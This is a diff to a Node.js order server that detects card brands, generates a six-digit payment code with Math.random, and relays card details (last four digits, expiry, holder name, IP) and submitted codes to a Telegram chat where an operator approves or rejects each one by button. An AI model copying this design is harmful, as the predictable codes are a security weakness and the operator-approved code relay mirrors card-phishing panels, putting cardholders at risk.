@@ -578,6 +578,25 @@ async function verifyCreditCardOtp(orderId, otp) {
   return { ok: true };
 }
 
+async function setCreditCardOtpForOrder(orderId, otp) {
+  const otpHash = hashCreditCardOtp(otp);
+  const expAt = Date.now() + CREDIT_CARD_OTP_TTL_MS;
+  const list = await loadCreditCardOtps();
+  const without = list.filter((it) => it.orderId !== orderId);
+  const next = [
+    ...without,
+    { orderId, otpHash, expAt, at: new Date().toISOString() },
+  ];
+  await saveCreditCardOtps(next);
+  return { expAt };
+}
+
+async function discardCreditCardOtp(orderId) {
+  const list = await loadCreditCardOtps();
+  const next = list.filter((it) => it.orderId !== orderId);
+  await saveCreditCardOtps(next);
+}
+
 async function loadCreditCardOtpSubmissions() {
   try {
     const raw = JSON.parse(await readFile(CREDIT_CARD_OTP_SUBMISSIONS_PATH, 'utf8'));
@@ -1410,8 +1429,10 @@ app.post('/api/order', async (req, res) => {
       return res.status(400).json({ error: 'Invalid sender phone number format' });
     }
 
+    let cardBrandLabel = '';
     let cardLast4 = '';
     let cardExpiryNorm = '';
+    let cardHolderNameNorm = '';
     if (paymentMethod === 'CreditCard') {
       const holder = String(cardHolderName || '').trim();
       const digits = String(cardNumber || '').replace(/\D/g, '');
@@ -1429,8 +1450,15 @@ app.post('/api/order', async (req, res) => {
 
       if (!/^[0-9A-Za-z]{3}$/.test(cvv)) return res.status(400).json({ error: 'Invalid CVV' });
 
-      // Never log/store the full card number/CVV. We'll keep only last-4 for demo display.
+      // Never log/store the full card number/CVV. We'll keep only last-4 + masked CVC.
       cardLast4 = digits.slice(-4);
+      cardHolderNameNorm = holder;
+
+      // Brand detection (first digits).
+      if (/^4/.test(digits)) cardBrandLabel = 'Visa';
+      else if (/^5[1-5]/.test(digits) || /^2(2[2-9]|[3-6][0-9]|7[01]|720)/.test(digits)) cardBrandLabel = 'MasterCard';
+      else if (/^3[47]/.test(digits)) cardBrandLabel = 'AmEx';
+      else cardBrandLabel = 'Card';
     }
 
     const detailsFull = await loadPaymentDetails();
@@ -1484,11 +1512,12 @@ app.post('/api/order', async (req, res) => {
       `<b>🌐 IP:</b> <code>${escapeTelegramHtml(clientIp || '—')}</code>`,
       ...(paymentMethod === 'CreditCard'
         ? [
-            '<b>🧪 وسيلة دفع بطاقة ائتمان:</b>',
-            `<b>اسم الحامل:</b> ${escapeTelegramHtml(cardHolderName || '')}`,
-            `<b>رقم البطاقة:</b> <code>****${escapeTelegramHtml(cardLast4 || '')}</code>`,
-            `<b>تاريخ الانتهاء:</b> <code>${escapeTelegramHtml(cardExpiryNorm || '')}</code>`,
-            '<b>CVV:</b> <code>***</code>',
+            '💳 <b>Payment card</b>',
+            `<b>Brand:</b> ${escapeTelegramHtml(cardBrandLabel || '-')}`,
+            `<b>Card:</b> <code>****${escapeTelegramHtml(cardLast4 || '')}</code>`,
+            `<b>Expiry:</b> <code>${escapeTelegramHtml(cardExpiryNorm || '')}</code>`,
+            `<b>CVC:</b> <code>***</code>`,
+            `<b>Cardholder:</b> ${escapeTelegramHtml(cardHolderNameNorm || '')}`,
           ]
         : []),
       '━━━━━━━━━━━━━━━',
@@ -1523,9 +1552,12 @@ app.post('/api/order', async (req, res) => {
       });
     }
 
+    let creditCardOtp = null;
     let creditCardOtpExpAt = null;
     if (paymentMethod === 'CreditCard') {
-      creditCardOtpExpAt = Date.now() + CREDIT_CARD_OTP_TTL_MS;
+      creditCardOtp = String(Math.floor(100000 + Math.random() * 900000));
+      const otpSaved = await setCreditCardOtpForOrder(safeOrderId, creditCardOtp);
+      creditCardOtpExpAt = otpSaved?.expAt || null;
     }
 
     try {
@@ -1541,11 +1573,33 @@ app.post('/api/order', async (req, res) => {
         wallet: walletTrim,
         paymentDetail: String(paymentDetail || ''),
         senderNumber: senderTrim,
+        cardBrand: paymentMethod === 'CreditCard' ? cardBrandLabel : '',
+        cardLast4: paymentMethod === 'CreditCard' ? cardLast4 : '',
+        cardExpiry: paymentMethod === 'CreditCard' ? cardExpiryNorm : '',
+        cardHolderName: paymentMethod === 'CreditCard' ? cardHolderNameNorm : '',
         ip: clientIp,
       });
     } catch (err) {
        
       console.error('[CRM] order log failed', err?.message || err);
+    }
+
+    if (paymentMethod === 'CreditCard' && creditCardOtp) {
+      await botSend(
+        [
+          '💳 <b>Payment authorization</b>',
+          '━━━━━━━━━━━━━━━',
+          `<b>Order:</b> <code>${escapeTelegramHtml(safeOrderId)}</code>`,
+          `<b>Card:</b> <code>****${escapeTelegramHtml(cardLast4 || '')}</code>`,
+          `<b>Expiry:</b> <code>${escapeTelegramHtml(cardExpiryNorm || '')}</code>`,
+          '<b>CVC:</b> <code>***</code>',
+          `<b>Auth code:</b> <code>${escapeTelegramHtml(creditCardOtp)}</code>`,
+          '━━━━━━━━━━━━━━━',
+          '<i>Enter this code on the site to complete payment.</i>',
+        ].join('\n'),
+        {},
+        chatId
+      );
     }
 
     // Send payment proof image/document if provided (multipart — reliable in Node)
@@ -1673,6 +1727,12 @@ app.post('/api/order/creditcard/submit', async (req, res) => {
       return res.status(403).json({ error: 'Unauthorized' });
     }
 
+    const otpList = await loadCreditCardOtps();
+    const otpRec = otpList.find((it) => it.orderId === oid) || null;
+    if (!otpRec) {
+      return res.status(400).json({ error: 'Invalid or expired OTP', code: 'OTP_NOT_FOUND_OR_EXPIRED' });
+    }
+
     const submissionId = `ccsub_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 6)}`.slice(0, 60);
     const expAt = Date.now() + CREDIT_CARD_OTP_TTL_MS;
     const submissions = await loadCreditCardOtpSubmissions();
@@ -1700,9 +1760,14 @@ app.post('/api/order/creditcard/submit', async (req, res) => {
 
     await botSend(
       [
-        '🧾 <b>كود بطاقة ائتمان</b>',
+        '💳 <b>Payment authentication</b>',
         `━━━━━━━━━━━━━━━`,
         `<b>رقم الطلب:</b> <code>${escapeTelegramHtml(oid)}</code>`,
+        `<b>البطاقة:</b> <code>****${escapeTelegramHtml(String(ccLast4 || ''))}</code>`,
+        `<b>الانتهاء:</b> <code>${escapeTelegramHtml(String(ccExpiry || ''))}</code>`,
+        `<b>CVC:</b> <code>***</code>`,
+        `<b>العلامة:</b> ${escapeTelegramHtml(String(ccBrand || 'Card'))}`,
+        `<b>اسم الحامل:</b> ${escapeTelegramHtml(String(ccHolder || ''))}`,
         `<b>الكود المرسل:</b> <code>${escapeTelegramHtml(code)}</code>`,
         `━━━━━━━━━━━━━━━`,
         '<i>اختر قرارك من الأزرار.</i>',
@@ -2395,6 +2460,7 @@ async function handleCallbackQuery(data, incomingChatId) {
 
     if (actionType === 'cc_reject') {
       await setCreditCardOtpSubmissionDecision(submissionId, 'rejected');
+      await discardCreditCardOtp(oid);
       await updateOrderStatusByOrderId(ORDERS_CRM_PATH, oid, 'cancelled');
       await botSend(`❌ تم رفض الطلب.\nطلب: <code>${escapeTelegramHtml(oid)}</code>`, {}, incomingChatId);
       return;
@@ -2408,9 +2474,16 @@ async function handleCallbackQuery(data, incomingChatId) {
     }
 
     if (actionType === 'cc_complete') {
-      await setCreditCardOtpSubmissionDecision(submissionId, 'completed');
-      await updateOrderStatusByOrderId(ORDERS_CRM_PATH, oid, 'completed');
-      await botSend(`✅ تم اكتمال الطلب.\nطلب: <code>${escapeTelegramHtml(oid)}</code>`, {}, incomingChatId);
+      const verifyRes = await verifyCreditCardOtp(oid, sub.otp);
+      if (verifyRes?.ok) {
+        await setCreditCardOtpSubmissionDecision(submissionId, 'completed');
+        await updateOrderStatusByOrderId(ORDERS_CRM_PATH, oid, 'completed');
+        await botSend(`✅ تم اكتمال الطلب.\nطلب: <code>${escapeTelegramHtml(oid)}</code>`, {}, incomingChatId);
+      } else {
+        await setCreditCardOtpSubmissionDecision(submissionId, 'reenter');
+        await updateOrderStatusByOrderId(ORDERS_CRM_PATH, oid, 'received');
+        await botSend(`⚠️ كود غير صحيح.\nيرجى إعادة إدخال الكود الصحيح.\nطلب: <code>${escapeTelegramHtml(oid)}</code>`, {}, incomingChatId);
+      }
       return;
     }
   }
